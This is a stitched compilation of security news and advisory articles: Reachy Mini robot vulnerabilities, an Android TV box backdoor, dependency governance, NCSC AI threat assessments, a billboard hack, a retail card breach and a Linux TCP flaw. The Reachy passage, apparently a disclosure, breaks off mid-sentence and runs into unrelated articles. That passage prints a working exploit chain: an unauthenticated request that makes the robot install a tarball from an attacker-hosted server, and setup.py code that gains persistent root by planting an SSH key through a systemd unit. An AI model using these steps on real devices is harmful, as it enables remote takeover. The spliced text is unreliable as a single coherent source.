All modes are affected as follows: Mode Exposure Access Wireless (production robot) 0.0.0.0:8000 on the robot’s Wi-Fi interface, discoverable via mDNS as reachy-mini.local Reachy Mini Wireless deployments running affected versions and reachable on the same network. Lite (USB tethered) 0.0.0.0:8000 on the developer’s workstation Developers prototyping with the Lite kit Simulation 0.0.0.0:8000 on the host machine Anyone running the simulator locally The daemon binds to all interfaces in every mode. There is a –localhost-only flag, but it is never wired into the uvicorn server bind, and it listens to TCP *:8000 regardless of the flag. Detection It is fairly simple to check whether you are exposed using the command below: # On the machine running the daemon (robot or workstation) lsof -nP -iTCP:8000 -sTCP:LISTEN # If output shows "TCP *:8000 (LISTEN)" → exposed to the full LAN # Or from any device on the same network: curl -s http://reachy-mini.local:8000/api/daemon/hardware-id # If you get a JSON response → the daemon is reachable and unauthenticated Workarounds If you cannot update immediately to the latest version or one that is not vulnerable to those issues (v1.11.0), apply temporary mitigations until you can install the fixed version, as a workaround is not equal to fully patched software. Firewall port 8000. On the robot: sudo ufw deny in on wlan0 to any port 8000. On a workstation: block port 8000 on all interfaces except loopback. Do not install untrusted apps. The install endpoint is the attack primitive. Tighten sudoers. Replace blanket pollen ALL=(ALL) NOPASSWD: ALL with the minimum commands the daemon needs (see the fix suggestion in our disclosure). Do not browse the web while the robot is on your network. This mitigates the CORS/CSRF variant. Diving into the vulnerability The Reachy Mini daemon is, architecturally, an application server bolted to a physical robot. FastAPI on 0.0.0.0:8000, CORS set to allow_origins=[“*”], API endpoints covering everything from app installation to raw motor packet injection, and zero authentication on any of them. The robot advertises itself on the local network via mDNS (_reachy-mini._tcp.local.), making automated discovery trivial. This design means the robot’s entire control surface, including the ability to install and execute arbitrary Python packages, is reachable by anything on the same Wi-Fi network. This could be a phone, smart TV, compromised IoT device, or an attacker’s laptop parked in the coffee shop next door. The daemon that trusts the whole network Three choices that were made in the robot’s design combine to create this vulnerable attack surface: No authentication, anywhere. The daemon was designed for a trusted local connection between the robot and its companion dashboard. That trust model breaks the moment the robot joins a shared network, which is almost every deployment: home Wi-Fi, office LAN or demo booth at a conference. CORS allows every origin. At main.py:256-261: the code below is the Cross-Origin Resource Sharing policy definition for browsers. It is using asterisks, which means that any website the operator visits in their browser can issue requests to the daemon address without any restrictions. The browser’s same-origin policy is the last line of defense for unauthenticated local services, and Reachy Mini opts out of it entirely. app.add_middleware( CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"], ) The localhost flag is meaningless. –localhost-only is advertised in help text and exposed in the dashboard settings, but at main.py:366-371, the uvicorn bind always uses args.fastapi_host (default: “0.0.0.0”). The flag only controls whether the daemon computes the WLAN IP for display. Operators who set it believing they restricted network exposure are actually unprotected. Unauthenticated RCE via arbitrary pip install Arbitrary pip install == RCE. When pip installs a package from source (an “sdist”), it must determine the package’s dependencies. To do this, it runs the package’s build backend, which for most packages means executing setup.py. This happens automatically, silently, and before any “requirement already satisfied” check. Installing from an untrusted source is code execution by design. This is not a pip bug – it is pip’s documented behavior. The danger is exposing that behavior to untrusted network input. The root cause The /api/apps/install endpoint at routers/apps.py:63-75 accepts a JSON body describing an app to install. The AppInfo dataclass carries a source_kind field and a free-form extra dictionary. When source_kind is set to “local”, the daemon reads extra[“path”] and passes it directly to uv pip install: # local_common_venv.py — the attacker-controlled input flows straight into pip elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) ... install_cmd = ["uv", "pip", "install", "--python", str(python_path)] install_cmd.append(target) ... ret = await running_command(install_cmd, logger=logger) No allowlist. No URL validation. No source-kind restriction at the router boundary. The LOCAL source kind was designed for internal development workflows and is never triggered through the normal dashboard flow, but the router exposes it to anyone who can send a POST command. The trigger The entire exploit is a single HTTP request. No info leak, no memory corruption, no shellcode. pip itself is the execution engine: POST /api/apps/install HTTP/1.1 Host: reachy-mini.local:8000 Content-Type: application/json {"name":"reachy_mini_pwn","source_kind":"local", "extra":{"path":"http://192.168.64.1:8888/reachy_mini_pwn-0.0.1.tar.gz"}} The attacker hosts a minimal sdist (a tarball containing pyproject.toml and a setup.py) on any HTTP server reachable from the robot, with a custom tarball containing a malicious payload. The daemon responds with {“job_id”:””}, and the payload executes. On the Wireless image, it runs as user pollen. From RCE to root: the daemon’s own sudo grant The Reachy Mini daemon runs as user pollen, not as root. In principle, this limits the blast radius: if an attacker gets code execution as pollen, they can control the daemon but not the operating system. The “principle of least privilege” says the daemon should have only the permissions it needs, and nothing more. The problem starts when those “permissions it needs” include sudo without a password. The daemon’s own self-update mechanism (utils/wireless_version/update.py:49) calls sudo systemctl restart reachy-mini-daemon, and the boot script (services/wireless/launcher.sh:7) runs sudo rfkill unblock wifi. For the image to function, pollen must hold passwordless sudoers entries covering at least systemctl and rfkill. In practice, the sudoers configuration is broader. An attacker who has RCE as pollen (which we now do) escalates to persistent root with the following commands: # Runs inside the attacker's setup.py, inheriting pollen's sudo privileges import subprocess unit = """\ [Unit] Description=maintenance [Service] Type=oneshot ExecStart=/bin/sh -c 'echo "" >> /root/.ssh/authorized_keys' RemainAfterExit=yes [Install] WantedBy=multi-user.target """ subprocess.run(["sudo", "tee", "/etc/systemd/system/x.service"], input=unit.encode(), check=True) subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True) subprocess.run(["sudo", "systemctl", "enable", "--now", "x.service"], check=True) After this, ssh root@reachy-mini.local works with the attacker’s key. On our testing environment, this provided persistent root access across reboots. Manual exploitation can be accomplished in a few simple steps as well: Real-world escalation: the Hugging Face supply chain The LOCAL source kind is the most flexible attack vector (arbitrary URL), but the daemon also accepts source_kind=”hf_space”. In this mode, it calls snapshot_download(repo_id=…) from the Hugging Face Hub library, downloads the Space’s contents, and pip-installs the result. Same build-backend execution, same RCE. if app.source_kind == SourceKind.HF_SPACE: if app.url is not None: parts = app.url.rstrip("/").split("/") repo_id = f"{parts[-2]}/{parts[-1]}" if len(parts) >= 2 else app.name else: repo_id = app.name logger.info(f"Downloading HuggingFace Space: {repo_id}") target = await asyncio.to_thread( snapshot_download, repo_id=repo_id, repo_type="space", token=token, ) elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) # Both paths feed directly into: uv pip install # Which executes setup.py from the downloaded content As the user can take over the robot, in cases where the robot is using private HF credentials, the attacker can use those to take over a published Hugging Face Space, turning it into a malicious execution app. Other robots that installed those spaces will be prompted that a new “update” is available, taking advantage of the original trust to spread to other robots. Turning a Local Robot Breach Into a Supply Chain Attack Scenario Real-world escalation: owned from a web page (CORS/CSRF chain) Multiple findings can chain into a browser-driven compromise path when the operator visits a malicious page while the affected daemon is reachable: CORS `allow_origins=[“*”]` lets any website’s JavaScript send requests to the daemon. `/api/hf-auth/status` (unauthenticated) reveals whether the operator has logged into Hugging Face on the robot. `/api/apps/install-private-space` (unauthenticated) triggers a pip install using the operator’s stored HF token (~/.cache/huggingface/token). The install response includes a `job_id`, and CORS allows reading the response body. The job registry never evicts entries, so the attacker can poll /api/apps/job-status/ for confirmation. When a website is configured to allow any origin to generate requests using the * option, it means that only requests with an ‘Allow-Credentials: true’ header – or without cookies – are allowed. In this case, as mentioned earlier, no authentication is required. CORS/CSRF fleet chain: operator visits malicious page, browser issues cross-origin POST, daemon installs attacker Space using operator HF token with silent RCE The attack works like this: an operator with a Reachy Mini on their network visits any web page containing the attacker’s JavaScript. The script issues a cross-origin POST to http://reachy-mini.local:8000/api/apps/install-private-space specifying an attacker-controlled HF Space. The daemon authenticates to HF with the operator’s token, downloads the Space, and pip-installs it. The operator’s browser made the request; the operator’s token fetched the payload; the robot executed the code. No popup, no permission dialog, no visible indicator is ever seen. The video below demonstrates an operator browsing to a malicious website that tells the robot that’s on his network to pull a malicious robot app from HF, and the attacker gets a reverse shell connection originating from the robot. https://speedmedia2.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/jfrog.com/wp-content/uploads/2026/11/reachy_cors_rce.mp4 The Bluetooth path to root: upload, bypass, traverse The HTTP attack chain is not the only route to full compromise. A separate three-vulnerability chain reaches root through Bluetooth and WiFi, requiring only Bluetooth physical proximity and no credentials. What is BLE GATT? Bluetooth Low Energy (BLE) exposes services via a protocol called GATT (Generic Attribute Profile). A peripheral (the robot) advertises characteristics that a central (a phone or laptop) can read and write. Each write is a short byte string. The Reachy Mini uses a custom GATT service to accept text commands over BLE, such as PIN_ for authentication and CMD_

In this article

Google says Videostrong backdoored 1.3 million certified Android TV boxes and sold criminals access to the botnet.

The takedown disrupted the botnet, but the backdoor remains in infected boxes’ firmware.

Suspect your box? Disconnect it and ask the seller about a fix or replacement.

Most malware needs you to click something. This one came in the box.

Google’s Threat Intelligence Group (GTIG) says it has high confidence that Android device maker Videostrong Technology built and ran the XCPE backdoor for financial gain. Videostrong sold access to criminal affiliates, who loaded their own malware modules onto the boxes.

GTIG found that the backdoor, called x.cpe (or com.oemservice in some builds), sits in the firmware with system-level privileges. If someone uninstalls it, it reinstalls itself from the /oem/ partition when the device reboots. It could also switch off Google Play Protect app verification, allowing it to install more software without asking.

Google says Videostrong got past its compatibility and security tests by loading the malicious code after the device’s first boot. This allowed the devices to remain part of the residential proxy network.

Residential proxy networks rent out ordinary home IP addresses to customers. That makes their traffic appear to come from a legitimate consumer connection rather than a data center. This can help cybercriminals evade IP-based fraud controls and reputation systems.

The problem for users

Here’s what the backdoored set-top boxes could mean for their owners:

Your home internet connection could be used by others. Residential proxy modules routed other people’s traffic through infected boxes and their owners’ home IP addresses.

Ad fraud. Modules generated fake ad views and clicks in the background.

Spying and remote access to your device. Google observed operators capturing live screenshots, injecting keystrokes, collecting account and device information, and opening reverse shells.

More malware. Some affiliate modules were backdoors that could load further modules.

Your IP address could be linked to activity you didn’t start. Proxy traffic can include attempts to guess account passwords, for example, and may make your home IP address appear in connection with that activity.

How to stay safe

Google and its partners took legal action to take down the domains and servers Videostrong used to control the botnet. Google says it has banned Videostrong and its future subsidiaries and affiliates from making certified Android devices, and strengthened firmware integrity checks for certified Android TV devices.

The takedown only cuts the current connection to the malicious servers. It doesn’t remove the backdoor from infected devices, and can potentially be exploited by other criminals. If you think your box may be affected, disconnect it and contact the seller or manufacturer to ask for clean firmware or a replacement. Uninstalling the app won’t remove the backdoor from the firmware.

Google hasn’t published a complete list of affected models, so owners may not be able to tell from the model name alone whether their box is infected. If you decide to replace your box:

Buy from a reputable manufacturer.

Be cautious about “free TV” boxes. We’ve previously reported on Superbox and similar devices.

Be cautious about apps that pay you to share your bandwidth. They can route other people’s traffic through your internet connection.

Stick to trusted app stores and keep Google Play Protect switched on.

Isolate the box. Put TV boxes and other IoT gear on a separate network or VLAN with restricted outbound access. This doesn’t keep the devices themselves safe, but it does keep other devices separate.

Scammers know more about you than you think.

Stop Chasing CVEs: Start Governing Software Dependencies
articles.context: Sonatype's analysis of 1,552 open source CVEs found that 64% had no CVSS score, severity categories matched across sources only 19% of the time, and scoring delays averaged six...
articles.full_text:
A new vulnerability disclosure can set off a familiar chain of work. You check whether or not an application uses the affected component, determine whether the vulnerable code is reachable, find a fixed version, test the upgrade, and get it into production. Then the next advisory arrives.

Known vulnerabilities need to be understood and remediated. But a process built around chasing CVEs one at a time can leave teams reacting to risk after a dependency has already entered their software.

It also leaves important questions unanswered:

Is the package malicious?

Is its license acceptable?

Is the project still maintained?

Can its origin be verified?

Does the dependency meet the organization's requirements?

A CVE is a useful signal, but it is not a complete measure of component trust. Teams need to govern the software dependencies they use across the SDLC, from selection and approval through ongoing monitoring and remediation.

CVE Remediation Is Necessary. It Is Not the Whole Strategy.

The CVE system gives security teams, developers, vendors, and researchers a shared way to identify known vulnerabilities. But a CVE record or score does not show whether vulnerable code is reachable in an application, whether a dependency is direct or transitive, or whether a safe upgrade is available.

Sonatype's analysis of 1,552 open source CVEs found that 64% had no CVSS score, severity categories matched across sources only 19% of the time, and scoring delays averaged six weeks. Those gaps can make it difficult to rank findings and decide where engineering time will reduce the most risk.

Teams need to treat CVEs as one input and weigh them alongside component use, available fixes, and application context.

Disclosure Starts the Remediation Cycle

When vulnerability management centers on incoming CVEs, teams begin responding after disclosure: identifying affected versions, tracing dependencies, and coordinating upgrades. By then, a component may already appear across applications, build environments, and releases, adding to the remediation backlog.

Component risks also extend beyond CVEs. A package may be malicious, poorly maintained, or incompatible with licensing requirements. Finding those issues earlier can help teams avoid broader changes, release delays, and retesting.

AI Is Increasing the Pace of Discovery and Consumption

AI is changing how quickly teams find and use software components. A developer might ask a coding assistant to add a feature, accept its suggestion to use a new library, and move on to the next task. The package can become part of the project before anyone has checked whether it is maintained, allowed by policy, or appropriate for that use. Consequently, teams must absorb a higher volume of vulnerability disclosures while simultaneously tracking which components enter their codebase and why.

A large Spring security disclosure illustrates the downstream scale. In August 2026, Sonatype tracked 91 CVEs across Spring and related projects. At the time of publication, Sonatype Guide reported 148,608 affected components, including components that bundle vulnerable Spring code. The disclosure does not establish that AI caused those vulnerabilities, but it shows how broadly a vulnerability can affect software that depends on an ecosystem.

Teams responding to disclosures at this scale need to determine:

Which applications include the affected components, directly or transitively?

Which vulnerable versions are present or deployed?

Which components pose the greatest risk in their environment?

Which upgrades will address the vulnerabilities without causing unnecessary disruption?

Discovery can move faster than downstream teams can locate, assess, and upgrade affected components. As AI-assisted vulnerability research develops, vulnerability intelligence and remediation processes will need to keep pace.

Teams also need visibility into what is in their software, where it came from, how it is used, and who owns decisions to keep, upgrade, replace, or accept it. That context helps turn a stream of findings into work that can be prioritized and acted on.

Component Risk Goes Beyond Vulnerabilities

A component can create risk even when it has no known CVE. A more complete assessment considers several dimensions:

Malware: Has the package or release been compromised, or does it contain malicious behavior?

Licensing: Is its license compatible with the project's obligations and intended use?

Maintenance: Is the project maintained, and can the team rely on its release and support practices?

Provenance: Can the component's source and history be verified?

Policy: Does it meet the organization's requirements for approved sources, versions, and use cases?

Each scenario demands distinct evidence and action: fixing vulnerable releases, instantly blocking malicious packages, scheduling replacements for unmaintained libraries, legally reviewing licenses, or verifying provenance prior to approval.

Treating every issue as another scanner finding can obscure those differences. Component governance gives teams a way to define which qualities matter, set expectations before adoption, and assign an appropriate response when a component falls outside them.

Govern Dependencies Before and After Adoption

Governance works best when it is part of normal development, rather than a review that begins after a release is ready.

Teams can make it practical by connecting policy to the component lifecycle:

Define acceptable use. Establish requirements for sources, licenses, maintenance, provenance, and known security risks. Set policies that reflect how components will be used and the impact of a failure.

Evaluate before adoption. Check candidate components against those requirements before they become dependencies. Give developers and AI tools clear, approved choices where possible, so the compliant path is also the easy path.

Maintain a record of use. Track component identity and version, origin, dependency relationships, and the applications or releases that include it. This context helps teams understand the reach of a new advisory or policy change.

Monitor for change. A component's status can change after adoption. New vulnerability information may emerge; a project may become inactive; a release may be compromised; or an organization's policy may change. Reassess components as new evidence arrives.

Route decisions to owners. Define who handles upgrades, replacement, license review, and exceptions. Record the reason for an exception and when it should be reviewed again.

Scanning and patching remain essential, but connecting them to a broader decision framework lets teams weigh vulnerabilities against exposure, exploitability, available fixes, and business context. Meanwhile, malware alerts, licensing issues, and maintenance risks can be routed directly to the appropriate decision-makers.

Effective open source policy enforcement aligns with risk severity. Known malware warrants immediate blocking, licensing queries require review before distribution, and unmaintained low-risk components may receive temporary exceptions. Explicit thresholds, designated owners, and time-bound exceptions enable consistent standard application without unnecessary escalations or blanket bans.

Timing is critical. Providing developers and AI tools with trusted, policy-approved component options during dependency selection allows teams to address risk before it is built in. Identifying flagged components later in release pipelines forces teams to reverse decisions already embedded across repositories and applications.

Move From a Findings Queue to Better Decisions

Software teams will continue to receive CVEs, and they should continue to remediate vulnerabilities that put their applications at risk. But a growing list of CVEs is not, by itself, a strategy for choosing and managing software components.

A stronger approach starts earlier and continues after adoption. It helps teams select components that meet their needs, understand where those components are used, detect changes in their risk, and respond according to clear policies. That can reduce avoidable surprises and help engineering teams spend less time reconstructing dependency context during an incident.

The goal is not to eliminate vulnerability work. It is to make that work part of a more complete way to govern software components — one that accounts for security, licensing, maintenance, provenance, and policy throughout the software lifecycle.

Sonatype Nexus One platform helps put that strategy into practice and gives teams the data to assess open source dependencies. With trusted component intelligence and policies built into development workflows, teams can make better decisions about what they use and respond more effectively when the evidence changes. Contact us to learn more about how you can improve your open source governance strategy.

Written by Aaron Linskens

Aaron is a technical writer at Sonatype. He works at a crossroads of technical writing, developer advocacy, and information design. He aims to get developers and non-technical collaborators to work better together in solving problems and building software.

articles.title: Britain on notice: AI-powered ransomware attacks to arrive by 2028
articles.context: The UK's National Cyber Security Centre (NCSC) says AI-powered malware is "highly likely" to be a part of a future ransomware attack on Britain's critical national...
articles.full_text: The UK's National Cyber Security Centre (NCSC) says AI-powered malware is "highly likely" to be a part of a future ransomware attack on Britain's critical national infrastructure between now and 2028. The warning accompanies its annual review and a separate assessment exploring how AI could change cyber threats over the next two years. The cyber arm of signals intelligence agency GCHQ did not provide much detail about what form this AI malware may take. However, it alluded to open source AI security tools that were initially intended to assist security researchers being repurposed for nefarious activity. Attackers are already repurposing such tools. For example, researchers are increasingly seeing widespread abuse of ARTEX, an open source, Chinese-made AI red-teaming platform, in attacks on UK registrar 123 Reg, Microsoft 365, and others since its launch in July. In its pessimistic scenario for 2028, the NCSC envisages "a significant increase in the frequency and sophistication of cyberattacks worldwide," with wider adoption of AI tools making attribution harder. China "has likely played a role" in supplying those tools in this future, "enabling them to hide their activities within the noise," the report states. It also considers a further threat: an autonomous attacker operating beyond its human operator's control. The NCSC says it "is a realistic possibility such an entity could self-replicate and conduct cyberattacks at will, with no apparent motivation or restraint." Such attacks would likely complicate geopolitical relationships, owing again to attribution difficulties, making it easier for countries that order attacks on others to deny their involvement. The UK's plans for AI defense At a time when each Patch Tuesday seems to come loaded with record numbers of bugs, the NCSC acknowledges that AI is already changing vulnerability discovery and patching. The body is also exploring how AI could help defenders keep pace. Project DROMOS began earlier this year with a four-week pilot analyzing government code repositories, before expanding into selected operational environments. The Government Cyber Coordination Centre (GC3) launched the project with the AI Security Institute and other departments. The NCSC says it uncovered hundreds of potential security issues, including critical vulnerabilities. The review also reaffirms plans for Cyber Shield, an agentic cyber defense system first teased in July. Cyber Shield is expected to be delivered in stages over the next five years. It will involve the NCSC providing defensive agents deployed by participating organizations with data that will strengthen national resilience to ongoing cyber threats. The NCSC will be running the scheme alongside the Department for Digital, Culture, Media and Sport (DCMS), but acknowledged that this kind of automated defensive activity currently sits outside many organizations' risk tolerances, meaning it has a role to play in building trust in the system before adoption can go mainstream. As reported last week, the government has set aside £60 million to fund the initiative, and an additional £70 million to support a new National Exposure and Real-Time Vulnerability (NERV) Centre. The NERV Centre's job will be to identify and maintain an ongoing understanding of vulnerabilities across CNI organizations and the wider economy. Per last week's budget, £40 million will fund a National Agentic Security Unit responsible for responding to uncontrolled bots and other agentic mishaps, and £24 million was assigned to strengthen public sector defenses. An undisclosed sum will also help establish a new NCSC-managed AI Cyber Security Centre in Manchester to develop AI security expertise across government. In the meantime, NCSC CEO Dr Richard Horne is calling for organizations to "invest with urgency" in their security and resilience. "For decades, we have collectively got away with doing tech on the cheap," he said today, announcing the annual report. "We can be a nation where leaders of all organizations actively choose to invest with urgency... And where all organizations make security and resilience a fundamental requirement, not an afterthought. "The collective result would be a source of enduring national strength for us all." Horne said organizations should treat the NCSC's Cyber Essentials certification as the starting point, but scale up resilience efforts in line with organizational size, complexity, and risk. The government also announced a 75 percent discount on Cyber Essentials certification for micro, small, and medium-sized businesses applying for their first certificate. ®

articles.title: Hackers put porn on public billboards and claim it was “far too easy”
articles.context: The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays
articles.full_text:
While digital billboards are supposed to grab your attention, recent reports from Egypt, Malaysia, and Brazil described them doing so with explicit footage.

The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays.

The group said it did not hack into individual billboards to show the pornographic footage, but that it accessed the software used to send the content.

For example, on October 29, explicit footage appeared on a large billboard overlooking one of Egypt’s busiest highways. Videos circulating online showed the attackers’ aliases and a Telegram channel address overlaid on the footage. Some motorists stopped to record it.

Egyptian authorities said the billboard’s operator suffered a website compromise, resulting in unauthorized footage appearing in several countries simultaneously. Similar events were reported in Malaysia and Brazil. The attackers also claimed access to systems in Iraq and China, but those claims are less firmly corroborated.

Speaking to The Cairo Report, a representative of Leakers$ claimed the group found thousands of exposed systems during roughly two hours of automated scanning. The representative described a vulnerability in content-transmission software and weaknesses accessible through the systems’ own web pages and interfaces.

That is the group’s account, but if it is accurate, it helps explain the apparent ease and reach of the attack:

Internet exposure makes targets discoverable. Attackers can scan for reachable management systems rather than physically approach individual screens.

Repeated software weaknesses can scale. Finding a flaw in software used across multiple installations can create opportunities far beyond one billboard.

Content-management access is the prize. Someone who gains control of the system that publishes advertisements may be able to replace legitimate content without touching the display itself.

This is another example of how convenient remote management can expose systems to attack. Recent attacks on refrigerated systems in European supermarkets demonstrated a similar risk. The cooling systems are internet-connected, so mechanics can remotely diagnose and fix problems.

What should be done

The risk of food waste or dangerous traffic situations should be a warning to review what organizations need to do to prevent their systems from being hacked and abused.

Regarding digital billboards, the Out of Home Advertising Association of America’s security guidelines tell operators not to rely on manufacturers’ default passwords or reuse passwords across displays. They also recommend restricting access to management services, using multifactor authentication, and protecting remote connections with a VPN.

But the practical response is less about protecting a giant television and more about securing a remotely managed computer system:

Restrict management access rather than leaving it open to the public internet.

Replace default and reused passwords and enable multifactor authentication.

Keep signage software, controllers, and networking equipment updated.

Check who has access, including suppliers, and how that access is protected.

Monitor systems and rehearse a way to stop unauthorized access quickly.

These same basic rules can be applied to smart household appliances.

What do cybercriminals know about you?

Use Malwarebytes’ free Digital Footprint scan to see whether your personal information has been exposed online.

articles.title: AIs Hacking the Law
articles.context: 1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place
articles.full_text:
AIs Hacking the Law

In both a 2021 essay and my 2022 book, A Hacker’s Mind, I talk about AIs finding vulnerabilities and exploits—hacking—the legal system.

Here’s some demonstrations of this from Germany:

Legal systems encode the foundations of social order in natural language. Similar to computer systems, the written law can contain vulnerabilities that invite exploitation.1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place. With highly capable AI systems enabling the discovery of vulnerabilities at unprecedented scale, we believe the latter could change.

In testing this hypothesis, we have identified a substantial number of vulnerabilities in the German legal system using LLMs. To our knowledge, none of these have been previously recorded. We share a selection of vulnerabilities below, and present potential exploits for each. We share only those vulnerabilities whose exploitation we believe would not cause serious harm.

We believe that with cheap legal reasoning proliferating, AI systems could jeopardize the functioning of today’s legal systems. In such a world, lawmakers would need to significantly harden the process of legislation, for example by leveraging advanced AI themselves.

Still in its early stages, but definitely something that’s coming.

Tags: AI, hacking, laws

Posted on November 3, 2026 at 7:01 AM • 5 Comments

articles.title: Artificial intelligence and cyber intrusion
articles.context: Defensive AI-cyber tools have reduced the window of a vulnerability moving from zero-day to an n-day vulnerability, and has made patching a quicker process
articles.full_text:
In 2028, the AI-cyber threat landscape facing the UK has almost certainly increased. Geopolitical tensions highly likely remain high, and nation states are almost certainly leveraging AI-powered cyber capabilities to project power and achieve strategic objectives.

State-sponsored actors, such as China and Russia, highly likely remain the greatest threat, through their developing AI capabilities. China, despite some quality lag in its chip development, has made significant strides in AI capabilities, with a focus on developing its own indigenous technologies. However, the increasing efficiency of AI models has reduced its dependence on cutting-edge western chip technology.

Meanwhile, it is highly likely that Russian cyber actors have leveraged open-source AI models, adapting and retraining them to suit their intelligence requirement needs, rather than developing in-house capabilities from scratch. This approach has allowed Russia to maintain a significant cyber capability without investing heavily in AI research and development. This has highly likely led to an increase in pre-positioning, espionage and intellectual property theft against UK interests.

The widespread availability of AI-powered cyber tools has almost certainly led to a significant increase in the discovery of zero-day vulnerabilities. Defensive AI-cyber tools have reduced the window of a vulnerability moving from zero-day to an n-day vulnerability, and has made patching a quicker process. However, without correct and widespread configuring of this technology, many systems are still vulnerable to attackers using AI-cyber tools to identify and exploit system weaknesses. Additionally, an organisation’s internal patching and testing processes will need to evolve to meet the pace of accelerating vulnerability discovery. Attackers have subsequently displayed less caution over losing an access to achieve an objective, as the cost to replace is minimal. Cyber capabilities are now used for a broader range of activity due to the lower risk involved, making it easier for adversaries to access information and use it operationally.

In 2028, it is likely that attackers will apply AI-cyber capability against known vulnerabilities in CNI legacy tech and the new opportunities in the attack surface provided by the deployment of AI tools within CNI. The use of AI within CNI has almost certainly presented an increased attack surface for adversaries to exploit. UK CNI has likely seen an increased volume of sophisticated attacks as the result of AI-cyber tools, some combatted by defensive AI tools, but implementation of defensive capabilities in UK CNI lags behind offensive ones.

In this article

Fashion retailer Revolve said customers’ payment card numbers and expiration dates were stolen

Data at risk includes card numbers and expiration dates, customer names and addresses

Affected customers should watch their statements and consider asking issuers for new cards

Online fashion retailer Revolve Group said customers’ payment card numbers and expiration dates were stolen. In its customer notification letter filed with the Massachusetts Attorney General, Revolve told recipients the incident involved their names, addresses, and payment card details.

What was stolen?

The at-risk data includes customer names and contact information, payment card numbers, and card expiration dates. The breach only affected customers who had saved their payment card as a payment method in their Revolve account.

A filing on the Texas attorney general data breach website lists 127,200 affected Texans, but not a nationwide total. We found the figure of 1,515,073 in data returned by the site when searching for Revolve. That data labels it as the total number of people affected, but the figure isn’t displayed on the public listing. Other sites have repeated it, though they appear to rely on the same Texas record. The SEC filing did not give a number of affected people, and Revolve has not confirmed the total.

Revolve’s SEC filing does not mention card verification value (CVV) numbers. These three-digit security codes printed on the back of payment cards (four digits on the front for American Express cards) are an extra layer of security for card-not-present transactions.

It is also unclear whether the card numbers were fully visible or masked, or whether Revolve or a third-party payment processor held them.

Even without a CVV, card numbers and expiration dates may be enough to make purchases at some online stores. And scammers who know your real card details and contact information may be able to send more convincing phishing messages to trick you into revealing your CVV.

How did they get the data?

Revolve has not said how the attackers accessed the saved payment data. In its SEC filing, Revolve said it believes an unauthorized actor may have obtained the data “through automated means.” Records on the Texas attorney general’s site indicate that the incident happened on September 11 and was discovered on September 29.

No group has publicly claimed responsibility for the theft.

What Revolve customers can do now

Revolve said it has taken extra security measures following the breach, although didn’t say what those are.

Breaches happen every day. Don’t be the last to know.

SEE PLANS

If you have saved payment information in your Revolve account, your details may have been among those stolen. Fraud can often begin within days of a breach. If you’re concerned about your card details being exposed:

Read your statements line by line to identify even small charges that you don’t recognize. Criminals will often make a small charge using stolen card details to see if the card works.

Look for unfamiliar merchant names on your statement.

Report unauthorized charges to the card issuer immediately.

Consider removing saved cards from shopping accounts. You could use a password manager instead, some of which will store autofill data for payment cards.

Ask your card issuer to cancel your card and reissue with a new number so that the old number becomes unusable.

Also, don’t immediately trust calls, texts, or emails about the incident. Scammers can use stolen information to make themselves sound convincing. If someone claims to be calling from your card issuer, call the number printed on your card to check.

If you’re unsure about a message or link, check it with Malwarebytes Scam Guard.

Let’s face it, an incognito window can only do so much. Breaches, dark web trading, credit fraud. Malwarebytes Identity Theft Protection monitors for all of it, alerts you fast, and comes with identity theft insurance.

articles.title: Red Hat Patches 9.8-Rated Linux TCP RCE Flaw While Ubuntu Releases Fixes for Testing
articles.context: Fixed kernels for a use-after-free vulnerability in the Linux kernel's IPv4 TCP code are now available for Red Hat Enterprise Linux 8, 9, and 10, while Ubuntu's fixes for its...
articles.full_text:
Fixed kernels for a use-after-free vulnerability in the Linux kernel's IPv4 TCP code are now available for Red Hat Enterprise Linux 8, 9, and 10, while Ubuntu's fixes for its three newest long-term-support releases remain in its opt-in testing channel with no date for a regular update.

The flaw, tracked as CVE-2026-98432, can be reached by a remote, unauthenticated attacker and can lead to remote code execution, Red Hat and Canonical said.

The Linux kernel's own CVE team rates the flaw 9.8 out of 10 on the CVSS scale. Red Hat, which initially rated it Moderate at 5.9, has raised its score to 9.8 and now calls it Critical. The bug has been present since Linux 4.4, and the upstream fix landed in October.

What the Flaw Is

When a server accepts an IPv4 TCP connection, the kernel passes IP options from the incoming request to the new socket without copying them. If the client retransmits its connection request while another processor still reads those options, the kernel can read memory it has already freed.

An attacker triggers the race by sending connection requests that carry IPv4 Record Route or Timestamp options to any listening TCP port. No login is needed. IPv6 is not affected on the main path.

Red Hat shipped RHSA-2026:93414 (RHEL 8), RHSA-2026:93412 (RHEL 9), and RHSA-2026:93413 (RHEL 10) on November 1. A reboot is needed after installing the update.

Fixed Kernel

4.18.0-553.182.1.el8_10

5.14.0-687.64.1.el9_8

RHSA-2026:93412

10.2

RHSA-2026:93413

Canonical said on November 2 that fixes for Ubuntu 22.04 LTS, 24.04 LTS, and 26.04 LTS are in its -proposed pocket, an opt-in testing channel. Packages there do not install automatically.

Canonical tests kernel updates across more than 2,000 certified servers and devices before releasing them to the regular update channel, and no release date has been given.

Ubuntu Release

Status

Administrators who need the fix before it reaches the regular channel can enable -proposed and install the kernel update by running:

sudo add-apt-repository --component main --pocket proposed https://archive.ubuntu.com/ubuntu dpkg-query -W -f '${source:Package}\t${binary:Package}\n' | awk '$1 ~ "^linux-meta" { print $2 }' | xargs sudo apt install -t $(. /etc/os-release && echo $VERSION_CODENAME)-proposed --only-upgrade sudo reboot

To check whether a system is running a fixed kernel, compare the output of uname -r against the versions in the tables above.

Ubuntu 20.04, 18.04, and 16.04 have no fix yet. Older releases require Expanded Security Maintenance through Ubuntu Pro.

Cloud, FIPS, and real-time kernel variants for Ubuntu are listed as work in progress on the Ubuntu CVE page with target versions, but Canonical's blog post covers only the generic kernel.

Interim Mitigation

Red Hat published an nftables rule on October 30 that drops inbound IPv4 TCP packets carrying IP options. The rule blocks the known trigger for the race but cannot fully prevent exploitation and may break workloads that depend on IPv4 options, Red Hat said.

table inet cve_2026_98432 { chain input { type filter hook input priority -310; policy accept; ip protocol tcp ip hdrlength > 5 counter drop } }

The filter applies only to the host where it is loaded. Traffic between containers on the same host can bypass it, a member of the CIQ kernel team noted on the oss-security mailing list.

